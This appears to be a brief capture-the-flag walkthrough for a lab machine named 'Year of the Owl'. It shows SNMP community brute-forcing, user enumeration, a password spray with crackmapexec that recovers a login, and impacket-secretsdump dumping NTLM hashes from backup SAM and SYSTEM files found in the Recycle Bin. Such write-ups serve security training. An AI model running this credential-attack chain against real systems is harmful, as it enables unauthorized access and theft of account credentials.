Disclosure

# Year of the Owl

# Reconn

onesixtyone  10.10.2.33 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 

Scanning 1 hosts, 3219 communities
10.10.2.33 [openview] Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)

snmpwalk -c openview -v1 10.10.2.33 1.3.6.1.4.1.77.1.2.25

└─# snmpwalk -c openview -v1 10.10.2.33 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"

─# crackmapexec smb 10.10.127.203 -u Jareth -p /opt/rockyou.txt


SMB         10.10.127.203   445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah 


Found in Recycle.bin 
sam.bak
system.bak

─# impacket-secretsdump  -sam sam.bak -system system.bak -ts local

Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::

